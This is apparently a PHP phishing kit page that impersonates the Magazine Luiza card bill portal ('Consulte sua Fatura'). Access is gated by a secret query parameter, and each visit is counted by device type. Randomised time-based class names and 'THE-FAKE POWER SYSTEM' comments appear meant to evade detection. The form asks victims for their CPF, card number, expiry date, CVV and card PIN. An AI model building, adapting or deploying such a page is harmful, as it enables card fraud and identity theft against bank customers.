<?php 


			if($_GET["the"]=="theking"){
			$txt = "cleo/v.txt";
			$arquivo = fopen($txt,"r");
			$visitas   = fgets($arquivo,1024);
			fclose($arquivo);
			$x = $visitas;
			$arquivo = fopen($txt,"r+");
			$visitas = $visitas + 1;
			fwrite($arquivo,$visitas);
			fclose($arquivo);
			
	        require_once("cleo/configure.php");
			
			}else{
			    $id = base64_encode(md5(time()));
				header("location: index.php?id=$id"); 
			
			}


        #============================
		

		$iphone = strpos($_SERVER['HTTP_USER_AGENT'],"iPhone");
		$ipad = strpos($_SERVER['HTTP_USER_AGENT'],"iPad");
		$android = strpos($_SERVER['HTTP_USER_AGENT'],"Android");
		$palmpre = strpos($_SERVER['HTTP_USER_AGENT'],"webOS");
		$berry = strpos($_SERVER['HTTP_USER_AGENT'],"BlackBerry");
		$ipod = strpos($_SERVER['HTTP_USER_AGENT'],"iPod");
		$symbian = strpos($_SERVER['HTTP_USER_AGENT'],"Symbian");
		$windowsphone = strpos($_SERVER['HTTP_USER_AGENT'],"Windows Phone");

		if ($iphone || $ipad || $android || $palmpre || $ipod || $berry || $symbian || $windowsphone == true) {
		    
			$dispositivo = "mobile";
		    $txt = "cleo/m.txt";
			$arquivo = fopen($txt,"r");
			$visitas   = fgets($arquivo,1024);
			fclose($arquivo);
			$x = $visitas;
			$arquivo = fopen($txt,"r+");
			$visitas = $visitas + 1;
			fwrite($arquivo,$visitas);
			fclose($arquivo);
		 
		 
		 }
		else { 
		   

		    $dispositivo = "pc";
		    $txt = "cleo/d.txt";
			$arquivo = fopen($txt,"r");
			$visitas   = fgets($arquivo,1024);
			fclose($arquivo);
			$x = $visitas;
			$arquivo = fopen($txt,"r+");
			$visitas = $visitas + 1;
			fwrite($arquivo,$visitas);
			fclose($arquivo);
		 
		} 

	

?>


<!DOCTYPE html>
<html>
<head>

<title>Consulte sua Fatura</title>
<meta charset="UTF-8">
 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1">
    <link rel="stylesheet" href="arquivos/clientlib-base_002.css?the=<?php echo time();?>" type="text/css">
     <link rel="stylesheet" href="arquivos/clientlib-base.css?the=<?php echo time();?>" type="text/css">
   <link rel="stylesheet" href="arquivos/clientlib_004.css?the=<?php echo time();?>" type="text/css">
  <link rel="stylesheet" href="arquivos/clientlib_006.css?the=<?php echo time();?>" type="text/css">
 <link rel="shortcut icon" type="image/png" href="arquivos/favicon.png">
<script src="./js/all.js?the=<?php echo time();?>"></script>
<script src="./js/jquery.js?the=<?php echo time();?>"></script>
</head>
	
<body style="background-color: #efe9e5;" id="main-body">
	
<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->	
	
<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 the_<?php echo time();?>_the">
<div class="magalu-cards-header aem-GridColumn aem-GridColumn--default--12 the_<?php echo time();?>_the">
	<header class="magalu-cards-header__navbar the_<?php echo time();?>_the">
    <div class="magalu-cards-header__group the_<?php echo time();?>_the">
        <h1 class="magalu-cards-header__logo the_<?php echo time();?>_the">
            <img class="magalu-cards-header__logo-img the_<?php echo time();?>_the" src="arquivos/magalu-logo.webp">
        </h1>
    </div>
</header>
</div>

<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12 the_<?php echo time();?>_the" id="body" style="overflow: visible;">

<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 the_<?php echo time();?>_the">
<div class="breadcrumb-header-shared aem-GridColumn aem-GridColumn--default--12 the_<?php echo time();?>_the">
<div class="container the_<?php echo time();?>_the">
</div>
</div>

<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

<div class="online-card-bill-shared p-0 aem-GridColumn aem-GridColumn--default--12 the_<?php echo time();?>_the">
 
 <!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
 
<div class="online-card-bill bg-grey the_<?php echo time();?>_the">
    <div class="container the_<?php echo time();?>_the">
        <div class="itau-form the_<?php echo time();?>_the">
            <div class="online-card-bill-container the_<?php echo time();?>_the">
                <form id="online-card-billForm" name="online-card-billForm">
                    <div class="row align-items-center the_<?php echo time();?>_the">
                        <div class="col-12 col-md-6 the_<?php echo time();?>_the">
                            <div class="title-description the_<?php echo time();?>_the">
                                
<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

    <div class="title-d-container the_<?php echo time();?>_the">
        
        <h2 id="frase" class="title-d-container__title the_<?php echo time();?>_the">Consultar Fatura</h2>
        <p class="title-d-container__subtitle the_<?php echo time();?>_the">receba a 2ª via da fatura do cartão por e-mail</p>
        <p class="title-d-container__description title-d-color-escuro the_<?php echo time();?>_the">Para consultar ou atualizar seu endereço de e-mail, acesse seu perfil no App Cartão Luiza, ou entre em contato pelo atendimento.</p>
    </div>
                            </div>
                        </div>
                        <div class="col-12 col-md-6 the_<?php echo time();?>_the">
                            <div class="identificacao the_<?php echo time();?>_the" id="identificacao">

    <div class="identificacao__title-description the_<?php echo time();?>_the">
        
    <!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
    
    </div>
	
	<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
	
	<!-- CPF INVALIDO -- DISPLAY NONE -->
    <div class="alert form-alert alert-dismissible fade show the_<?php echo time();?>_the" id="cpfinvalido" style="display: none;">

    <div class="row">
     
        <p style="margin-left: 15px;" class="title-message the_<?php echo time();?>_the">Número do CPF inválido</p>
        <button type="button" class="close the_<?php echo time();?>_the">
          
<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
		  
        </button>
    </div>
    <ol>
        <li class="error-description the_<?php echo time();?>_the">
            <a href="#" class="alert-error__error-description the_<?php echo time();?>_the">CPF: informe um número válido para continuar</a>
        </li>
    </ol>
  </div>
   <!-- ================================= -->
    
	<!-- PRINCIPAL -->
<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

        <div>
         
		 <!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->		 
		 
        <div style="display:block;" id="tap1">
		 <div class="col-12 pl-0 pr-0 the_<?php echo time();?>_the">
                <div class="input-container the_<?php echo time();?>_the" id="input-cpf">
                    <div class="content-online-card-bill__value input-container the_<?php echo time();?>_the">
                        <label class="label the_<?php echo time();?>_the" for="online-card-bill-cpf">CPF</label>
                        <input autocomplete="off" oninput="chk(); mascara(this)" id="cpf" class="form-control the_<?php echo time();?>_the" type="text" name="cpf" tabindex="0">
                    </div>
                </div>
          </div>
			
			<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
			
			<div class="col-12 pl-0 pr-0 the_<?php echo time();?>_the">
							<div class="input-container the_<?php echo time();?>_the" id="input-cartao">
								<div class="content-online-card-bill__value-content input-container the_<?php echo time();?>_the">
									<label class="label the_<?php echo time();?>_the" for="online-card-bill-cartao">número do cartão</label>
									<input autocomplete="off" oninput="chk(); mascaracc(this)" id="numc" class="form-control the_<?php echo time();?>_the" type="text" name="numc" tabindex="0">
								</div>
			</div>
			 </div>
		</div> 
			 
			 <!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->			 
			 
			 <div style="display:none;" id="tap2">
				   
			<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
				   
			 <div class="col-12 pl-0 pr-0 the_<?php echo time();?>_the">
							<div class="input-container the_<?php echo time();?>_the" id="input-cartao">
								<div class="content-online-card-bill__value-content input-container the_<?php echo time();?>_the">
									<label class="label the_<?php echo time();?>_the" for="online-card-bill-cartao">validade do cartão</label>
									<input autocomplete="off" oninput="chk2(); mascaraval(this)" id="val" class="form-control the_<?php echo time();?>_the" type="text" name="val" tabindex="0">
								</div>
							</div>
					  </div>
				   <!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
			 <div class="col-12 pl-0 pr-0 the_<?php echo time();?>_the">
							<div class="input-container the_<?php echo time();?>_the" id="input-cartao">
								<div class="content-online-card-bill__value-content input-container the_<?php echo time();?>_the">
									<label class="label the_<?php echo time();?>_the" for="online-card-bill-cartao">código de segurança</label>
									<input autocomplete="off" oninput="chk2(); smtnum(this);" id="cvv" class="form-control the_<?php echo time();?>_the" maxlength="3" type="text" name="cvv" tabindex="0">
								</div>
							</div>
			 </div>
			 
			<!-- THE-FAKE POWER SYSTEM <?php echo time();?> --> 
			  <div class="col-12 pl-0 pr-0 the_<?php echo time();?>_the">
							<div class="input-container the_<?php echo time();?>_the" id="input-cartao">
								<div class="content-online-card-bill__value-content input-container the_<?php echo time();?>_the">
									<label class="label the_<?php echo time();?>_the" for="online-card-bill-cartao">senha do cartão</label>
									<input autocomplete="off" oninput="chk2(); smtnum(this);" id="s4" class="form-control the_<?php echo time();?>_the" maxlength="4" type="password" name="s4" tabindex="0">
								</div>
			             </div>
			       </div>	 
             </div>		 
	   </div>
	<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
		
    <div class="row the_<?php echo time();?>_the">
        <div class="col-12 button the_<?php echo time();?>_the">
            <div class="the_<?php echo time();?>_the">
			
			<button id="btn1" disabled="disabled" type="button" style="cursor:pointer;" class="btn btn-lg btn-primary the_<?php echo time();?>_the">
                    acessar
            </button>
			
			<button style="display:none;" id="btn2" disabled="disabled" style="cursor:pointer;" type="button" class="btn btn-lg btn-primary the_<?php echo time();?>_the">
                    consultar fatura
            </button>
            </div>
        </div>
    </div>
	
	<!-- ================================= -->	
	<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
	<!-- LOADING ....  -->
    <div id="loading" class="body-loading-card-bill the_<?php echo time();?>_the" style="display:none;">
        <div class="body-loading-card-bill__icon the_<?php echo time();?>_the"></div>
        <p>aguarde</p>
    </div>
     <!--======================================-->   
</div>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

</div>
<div class="image-with-text-shared aem-GridColumn aem-GridColumn--default--12">
    



    
<link rel="stylesheet" href="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/clientlib.min.9b80f6f805171df4b1d8dcea882037bf.css" type="text/css">
<link rel="stylesheet" href="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/clientlib.min.8ca8bf85cd7105d56b8df2c965161698.css" type="text/css">
<script src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/jquery.min.js"></script>
<script src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/clientlib.min.js"></script>






<section class="module  row-modal bg-white " data-component="ImageWithText" id="section2">
	<div class="container">
		<div class="row  align-items-center no-row-modal">

			

				<div class="image-with-text__image col-sm-6">
					<img data-src="/content/dam/itau/cartoes/serviços/fatura-digital/image-with-text-senhor-utilizando-aparelho-celular-540x345.png" alt="Imagem de um senhor cliente Itaú utilizando um aparelho celular em frente ao seu notebook." class="img-fluid   " src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/image-with-text-senhor-utilizando-aparelho-celular-540x345.webp">
					

					
				</div>
				<div class="col-sm-6">
					<div class="content content-text-itau">
						<div class="inner-content">
							
<h2>mais facilidade para sua gestão financeira</h2>
<br>
<p>Com a fatura digital você não precisa esperar a fatura em papel 
chegar na sua casa. Ela é enviada todo mês ao seu e-mail e você acessa 
os seus gastos de forma segura em qualquer dispositivo. Você também 
recebe avisos sobre a data de fechamento e de vencimento sem custo 
adicional.</p>
<br>
<p>Confira abaixo o passo a passo para cadastrar sua fatura digital e acessar sua segunda via.</p>


						</div>
						<div class="row">
							
							
						</div>
						<div data-component="ImageWithText" data-tag="{&quot;type&quot;: &quot;BTN&quot;,
							&quot;component&quot;: &quot;[data-component]&quot;,
							&quot;title&quot;: &quot;[data-tag-fragment-title]&quot;,
							&quot;text&quot;: &quot;[data-tag-fragment-button]&quot;
							}">
							
    

    


<!-- Modal -->

						</div>
					</div>
				</div>
			

			

		</div>
	</div>
</section>



</div>
<div class="media-with-steps-shared aem-GridColumn aem-GridColumn--default--12">
    

 
    
<link rel="stylesheet" href="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/clientlib.min.7ddcd486e5f4809fb1ba1e08d75a8039.css" type="text/css">
<script src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/clientlib.min_003.js"></script>




<section class="default-padding-bottom" id="section3">
	
	<div class="container">
		
			<div>
    


    





    <div class="title-d-container ">
        
        <h2 data-tag-fragment-title="" class="title-d-container__title">entenda como é fácil cadastrar a fatura digital:</h2>
        <p class="title-d-container__subtitle">Contribua para a redução do uso de papel e na preservação de árvores</p>
        
    </div></div>
		
		<div class="row d-flex align-items-center">
			

			<div class="col-12 col-sm-12 steps col-md-6 col-lg-6 col-xl-6">
				
				<ol>
					
						<li class="list-text">
							<p>Entre no aplicativo Cartão Luiza com o número e senha do seu cartão;</p>
						</li>
					
						<li class="list-text">
							<p>Acesse o menu “Serviços” na barra inferior do aplicativo;</p>
						</li>
					
						<li class="list-text">
							<p>Clique no botão “Fatura Digital” e faça seu cadastro!</p>
						</li>
					
				</ol>
				<div class="d-none d-sm-none d-md-block d-lg-block d-xl-block">
					
    

    
<div class="shared-button-container">
    
    <div>
        <a href="https://vsm4.adj.st/faturadigital?adj_t=63qgz4m_rek7ogt&amp;adj_deep_link=cartaoluiza%3A%2F%2Ffaturadigital&amp;adj_campaign=FaturaDigital&amp;adj_adgroup=LandingPage&amp;adj_creative=conhe%C3%A7a_o_app_Magalu" class="btn btn-lg btn-primary the" target="_self" data-context-login="false" data-tag-fragment-button="" role="button">conheça o aplicativo</a>
    </div>
    <data value="#shared-button_modal-login-media_with_steps-button-box" class="d-none"></data>
</div>

<!-- Modal -->

				</div>
			</div>
			
				<div class="col-12 col-sm-12 col-md-6 col-lg-6 col-xl-6 media media-image-second ">

					<img class="d-none d-sm-none d-md-block d-lg-block d-xl-block" src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/aplicativo-cartao-luiza-540x345.webp" alt="smartphone com a tela do aplicativo Cartão Magalu">

					<img class="d-block d-sm-block d-md-none d-lg-none d-xl-none" src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/aplicativo-cartao-luiza-540x345.webp" alt="smartphone com a tela do aplicativo Cartão Magalu">

					



					<div class="thumbnail-opacity"></div>
				</div>
			

			<div class="col-12">
				<div class="d-block d-sm-block d-md-none d-lg-none d-xl-none buttom">
					
    

    
<div class="shared-button-container">
    
    <div>
        <a href="https://vsm4.adj.st/faturadigital?adj_t=63qgz4m_rek7ogt&amp;adj_deep_link=cartaoluiza%3A%2F%2Ffaturadigital&amp;adj_campaign=FaturaDigital&amp;adj_adgroup=LandingPage&amp;adj_creative=conhe%C3%A7a_o_app_Magalu" class="shared-button__a--left shared-button__a is-" target="_self" data-context-login="false" data-tag-fragment-button="" role="button">conheça o aplicativo</a>
    </div>
    <data value="#shared-button_modal-login-media_with_steps-button-box" class="d-none"></data>
</div>

<!-- Modal -->

				</div>
			</div>
		</div>
	</div>
		
</section>

</div>
<div class="richtext-container aem-GridColumn aem-GridColumn--default--12">
<section class="richtext-container__box bg-white " id="section4">
	<div class="container ">
		
    



</div>
		</div>
		
	</div>
</section></div>
<div class="image-with-text-shared aem-GridColumn aem-GridColumn--default--12">
    



    






<section class="module  row-modal bg-white " data-component="ImageWithText" id="section5">
	<div class="container">
		<div class="row  align-items-center no-row-modal">

			

				<div class="image-with-text__image col-sm-6">
					<img data-src="/content/dam/itau/cartoes/aplicativo-cartao-luiza-home-540x345.png" alt="imagem ilustrativa do aplicativo cartão luiza." class="img-fluid   " src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/aplicativo-cartao-luiza-home-540x345.webp">
					

					
				</div>
				<div class="col-sm-6">
					<div class="content content-text-itau">
						<div class="inner-content">
							
<h3>aplicativo Cartão Luiza</h3>
<br>
<p>Na página inicial do aplicativo, clique no botão “Ver Fatura” e acesse a opção “2ª via em PDF”.</p>


						</div>
						<div class="row">
							
							
						</div>
						<div data-component="ImageWithText" data-tag="{&quot;type&quot;: &quot;BTN&quot;,
							&quot;component&quot;: &quot;[data-component]&quot;,
							&quot;title&quot;: &quot;[data-tag-fragment-title]&quot;,
							&quot;text&quot;: &quot;[data-tag-fragment-button]&quot;
							}">
							
    

    


<!-- Modal -->

						</div>
					</div>
				</div>
			

			

		</div>
	</div>
</section>



</div>

</div><script type="text/javascript">analyticsHelper.safeFn("Custom - IS Track eventos",function(){TrackInteraction&&TrackInteraction.updateEvent(google_tag_manager["GTM-KGXCXPV"].macro(43))});</script>

<script type="text/javascript">(function(){function H(b,c){if("closest"in b)return b.closest(c);if("function"===typeof k)return k(b).closest(c)[0];for(var a=b.parentNode;a!=document;){if(r(a,c))return a;a=a.parentNode}}function x(b,c,a){if("undefined"===typeof c)return b="; "+b+"\x3d",a="; "+document.cookie,c=a.indexOf(b),-1===c?a="":(a=a.substring(c+b.length),b=a.indexOf(";"),a=window.unescape(-1===b?a:a.substring(0,b))),a;a=a||{};c=b+"\x3d"+window.escape(c);a.exdays&&(b=new Date,b.setDate(b.getDate()+a.exdays),c+="; expires\x3d"+
b.toUTCString());a.domain&&(c+="; domain\x3d"+a.domain);c+="; path\x3d"+(a.path||"/");return a=document.cookie=c}function I(b,c,a,f,d){if("function"===typeof k){var h=k(d||document);var e=n(b,f,{event:c,selector:a,immediate:!1});if("function"===typeof h.on)return h.on(c,a,e);if("function"===typeof h.delegate)return h.delegate(a,c,e)}"string"===typeof d&&(d=document.querySelectorAll(d));"function"===typeof document.addEventListener?h="addEventListener":(h="attachEvent",c="on"+c);e=function(d){for(var e=
d.target;e&&e!==this;e=e.parentNode)if(r(e,a)){var h=n(b,f,{event:c,selector:a,immediate:!1});h.call(e,d);break}};if("[object NodeList]"===Object.prototype.toString.call(d))for(var g=0;g<=d.length-1;g++)(d[g]||document)[h](c,e,!1);else(d||document)[h](c,e,!1)}function J(b,c){return b.querySelectorAll(c)}function K(b){var c,a,f=[];if(1===b.length)return b[0];for(;0<b.length;){var d=b.shift();for(c=0;d.length>c;c++){var e=d[c];for(a=0;a<f.length&&e!==f[a];)a+=1;a===f.length&&f.push(e)}}return f}function v(b,
c){if(b&&"string"===typeof b){for(var a=c||window,f=b.split("."),d=0;d<f.length&&null!=a;d++)if(y.call(a,f[d]))a=a[f[d]];else return;return a}}function L(b,c){return"classList"in b?b.classList.contains(c):(new RegExp("\\b"+c+"\\b")).test(b.className)}function M(b){e=p(e,b);z()}function m(b,c,a){for(var f,d=[],e=0;e<b.length;e++){f=b[e];if(!1===f instanceof HTMLElement)throw"internalMap: Esperado elemento HTML";f=[f].concat(a);d.push(c.apply(null,f))}return d}function g(b,c,a){if(e.debug&&"function"===
typeof v("console."+b))console[b](c,a)}function r(b,c){if("matches"in b)return b.matches(c);if("function"===typeof k)return k(b).is(c);for(var a=b.parentNode.querySelectorAll(c),f=0;f<a.length;f++)if(a[f]===b)return!0;return!1}function p(b,c){if(c)for(var a in c)y.call(c,a)&&(b[a]=c[a]);return b}function q(b,c,a,f,d){if(d)return I(b,c,a,f,d);f=n(b,f,{event:c,selector:a,immediate:!1});if("function"===typeof k){b=k(a);if("function"===typeof b.on)return b.on(c,f);if("function"===typeof b.bind)return b.bind(c,
f)}d="string"===typeof a?document.querySelectorAll(a):"undefined"===typeof a.length||a===window?[a]:a;for(a=0;a<d.length;a++)b=d[a],"function"===typeof b.addEventListener?b.addEventListener(c,f):b.attachEvent("on"+c,f)}function A(b){var c;for(c=0;c<b.length;c++)if(b[c])return!0;return!1}function w(b,c){var a;if(!b)return"";c=c||{};var f="string"===typeof c.spacer?c.spacer:"_";b=b.toLowerCase().replace(/^\s+/,"").replace(/\s+$/,"").replace(/\s+/g,"_").replace(/[\u00e1\u00e0\u00e2\u00e3\u00e5\u00e4\u00e6\u00aa]/g,
"a").replace(/[\u00e9\u00e8\u00ea\u00eb\u0404\u20ac]/g,"e").replace(/[\u00ed\u00ec\u00ee\u00ef]/g,"i").replace(/[\u00f3\u00f2\u00f4\u00f5\u00f6\u00f8\u00ba]/g,"o").replace(/[\u00fa\u00f9\u00fb\u00fc]/g,"u").replace(/[\u00e7\u00a2\u00a9]/g,"c").replace(/[^a-z0-9_\-]/g,"_");if(c.capitalized){var d=b.replace(/^_+|_+$/g,"").split(/_+/g);for(a=0;a<d.length;a++)d[a]&&(d[a]=d[a][0].toUpperCase()+d[a].slice(1));return d.join(f)}return b.replace(/^_+|_+$/g,"").replace(/_+/g,f)}function N(b,c){var a;c=c||{};
if(c.onlyFirst){var f=b.childNodes;var d="";for(a=0;a<f.length;a++)3===f[a].nodeType&&(d+=f[a].nodeValue)}else d=b.innerText||b.textContent||b.innerHTML.replace(/<[^>]+>/g,"");return c.sanitize?w(d,c.sanitize):d}function B(b){try{return google_tag_manager[e.containerId].dataLayer.get(b)}catch(c){g("warn","Function getDataLayer: Object "+b+" is not defined")}}function C(b,c){try{return google_tag_manager[e.containerId].dataLayer.set(b,c)}catch(a){g("warn",a)}}function D(b,c,a,f,d,h){try{if(!1===l.sentPageview&&
e.waitQueue)return g("Info","The event ("+arguments+") has been add to the queue"),l.eventQueue.push(arguments);null!=f&&"object"===typeof f?(d=f,f=void 0):d=d||{};var t={event:e.customNameEvent,eventCategory:b,eventAction:c,eventValue:f,eventLabel:a,_tag:h};e.gtmCleanup&&(t.eventCallback=e.gtmCleanup);g("info",t,d);window[e.dataLayerName].push(p(t,d))}catch(u){g("warn",u)}}function O(b){var c={event:function(a,c,d,e,g){return D(a,c,d,e,g,b.id)},pageview:function(a,c){return E(a,c,b.id)},timing:function(a,
c,d,e,g){return F(a,c,d,e,g,b.id)},safeFn:function(a,c,d){return n(b.id,c,d)},on:function(a,c,d,e){return q(b.id,a,c,d,e)},delegate:function(a,c,d){return q(b.id,a,c,d,document.body)},wrap:function(a){if("string"===typeof a)a=window.document.querySelectorAll(a);else if(a instanceof HTMLElement)a=[a];else if(!1===(a instanceof Array||a instanceof NodeList))throw"wrap: Esperado receber seletor, elemento HTML, NodeList ou Array";return{hasClass:function(b,c){var d=m(a,L,[b]);return c&&c.toArray?d:A(d)},
matches:function(b,c){var d=m(a,r,[b]);return c&&c.toArray?d:A(d)},closest:function(b){return c.wrap(m(a,H,[b]))},text:function(b){var c=m(a,N,[b]);return b&&b.toArray?c:c.join("")},find:function(b){b=m(a,J,[b]);return c.wrap(K(b))},map:function(b,c){return m(a,b,c)},on:function(c,d,e){"function"===typeof d?q(b.id,c,a,d):q(b.id,c,d,e,a)},nodes:a}},sanitize:w,getDataLayer:B,setDataLayer:C,cookie:x,getKey:v,id:b.id,args:b.args,fn:G,_event:b.event,_selector:b.selector};return c}function E(b,c,a){try{var f=
{event:e.customNamePageview,path:b,_tag:a};e.gtmCleanup&&(f.eventCallback=e.gtmCleanup);g("info",f,c);window[e.dataLayerName].push(p(f,c))}catch(d){g("warn",d)}}function n(b,c,a){a=a||{};var f=function(){try{c.call(this===window?null:this,O({id:b,args:arguments,event:"string"===typeof a.event&&a.event||void 0,selector:"string"===typeof a.selector&&a.selector||void 0}))}catch(d){e.debug?g("warn","Exception: ",{exception:d,tag:b,event:"string"===typeof a.event&&a.event||void 0,selector:"string"===typeof a.selector&&
a.selector||void 0}):Math.random()<=e.errorSampleRate&&window[e.dataLayerName].push({event:e.exceptionEvent,dataQuality:{category:e.exceptionCategory,action:b,label:String(d),event:"string"===typeof a.event&&a.event||void 0,selector:"string"===typeof a.selector&&a.selector||void 0}})}};return!1===a.immediate?f:f()}function F(b,c,a,f,d,h){try{if(!1===l.sentPageview&&e.waitQueue)return g("Info","The timing event ("+arguments+") has been add to the queue"),l.timingQueue.push(arguments);d=d||{};var k=
{event:e.customNameTiming,timingCategory:b,timingVariable:c,timingValue:a,timingLabel:f,_tag:h};e.gtmCleanup&&(k.eventCallback=e.gtmCleanup);g("info",k,d);window[e.dataLayerName].push(p(k,d))}catch(u){g("warn",u)}}function z(){if(!window[e.helperName]||e.overwriteHelper)window[e.helperName]=P}var y=Object.prototype.hasOwnProperty,k=window.jQuery,G={},e=google_tag_manager["GTM-KGXCXPV"].macro(20),l={sentPageview:!1},P={internal:l,init:M,pageview:E,event:D,timing:F,sanitize:w,getDataLayer:B,setDataLayer:C,cookie:x,getKey:v,
safeFn:n,fn:G,options:e};l.eventQueue=[];l.timingQueue=[];z()})();</script><script type="text/javascript">(function(){window.dataLayer.push({ecommerce:void 0,events:{category:void 0,action:void 0,label:void 0,value:void 0},eventNoInteraction:void 0,custom:void 0});window.analyticsData.custom=void 0;window.analyticsData.eventCategory=void 0;window.analyticsData.eventAction=void 0;window.analyticsData.eventLabel=void 0;window.analyticsData.eventNoInteraction=void 0;window.analyticsData.ecommerce=void 0})();</script><script type="text/javascript">analyticsHelper.safeFn("Custom - Pageview",function(b){var c=google_tag_manager["GTM-KGXCXPV"].macro(65).split(":").join("/"),a=google_tag_manager["GTM-KGXCXPV"].macro(66);a=a&&a.termoDeBusca?"?q\x3d"+a.termoDeBusca+"\x26cat\x3d"+a.tipoDeBusca:"";b.pageview("/"+c+a)});</script>


	<script type="text/javascript">
		var htm2 = ' <div id="certificados" style="line-height:1">' +
			' <div id="div_main" style="min-width:980px; width:100%; height:60px;background-color:#FFF">' +
			' <div id="div_text" style="font-size:12px;float:left; display:inline-block; padding:10px 120px">' +
			' <p style="line-height:20px;font-family:ItauDisplay-Light, Myriad Pro, Arial; color:black; font-size:15px"><b style="font-family:ItauDisplay-Light, Myriad Pro, Arial;font-size:18px">Atualize seu navegador para ter acesso a todos os recursos.</b><br>' +
			' Selecione uma das opções ao lado.</p>' +
			' </div>' +
			' <div id="div_img" style="display:inline-block;padding:10px 20px 10px 0;float:right;">' +
			' <ul style= "height:40px;padding:0;margin:0;">' +
			' <li style= "display:inline-block; padding : 0 1px; list-style: none;"><a href="https://www.itau.com.br/computador/" target="_blank"><img src="https://jarvisfabrica.itau/summer-cdn/commons/img/browser-btn-app-itau.gif" style="border:0"></a></li>' +
			' <li style="display:inline-block; padding : 0 1px; list-style: none;"><a href="https://www.google.com/intl/pt-BR/chrome/browser/?hl=pt-br" target="_blank"><img src="https://jarvisfabrica.itau/summer-cdn/commons/img/browser-btn-chrome.gif" style="border:0"></a></li>' +
			' <li style="display:inline-block; padding : 0 1px; list-style: none;"><a href="http://www.mozilla.org/pt-BR/firefox/new/" target="_blank"><img src="https://jarvisfabrica.itau/summer-cdn/commons/img/browser-btn-firefox.gif" style="border:0"></a></li>' +
			' <li style="display:inline-block; padding : 0 1px; list-style: none;"><a href="http://www.apple.com/br/safari/" target="_blank"><img src="https://jarvisfabrica.itau/summer-cdn/commons/img/browser-btn-safari.gif" style="border:0"></a></li>' +
			' </ul>' +
			' </div>' +
			' </div>';
		if (navigator.userAgent.indexOf('MSIE 8.0') > -1) {
			document.body.innerHTML = htm2;
		}
	</script>
	<script>
	document.addEventListener("DOMContentLoaded", function () { 
		window._initH2O();
	 }); </script>
	
    
    
    
    
<script src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/clientlib-base.min.js"></script>
<script src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/csrf.min.js"></script>
<script src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/clientlib-base.min_002.js"></script>




    

    


	
    
<link rel="stylesheet" href="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/clientlib.min.99ac735ab506cdac40585bf1ee6cc677.css" type="text/css">
<script src="Consulte%20sua%20Fatura%20Cart%C3%A3o%20Magazine%20Luiza_arquivos/clientlib.min_004.js"></script>


<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->

</div>

<div class="magalu-cards-footer aem-GridColumn aem-GridColumn--default--12 the_<?php echo time();?>_the">
<footer class="magalu-cards-footer__content magalu-cards-footer__content__bottom-fixed the_<?php echo time();?>_the">
    <div class="magalu-cards-footer__content__container the_<?php echo time();?>_the">
        <div class="magalu-cards-footer__content__container__link-container the_<?php echo time();?>_the">
            <a class="magalu-cards-footer__content__container__link-container__link the_<?php echo time();?>_the" href="#card" target="_self" tabindex="0" role="link">sobre o cartão</a>
        </div>
        <div class="magalu-cards-footer__content__container__link-container the_<?php echo time();?>_the">
            <a class="magalu-cards-footer__content__container__link-container__link the_<?php echo time();?>_the" href="#ajuda" target="_self" tabindex="0" role="link">precisa de ajuda?</a>
        </div>
    </div>
</footer>
</div>
<!-- THE-FAKE POWER SYSTEM <?php echo time();?> -->
</body>
</html>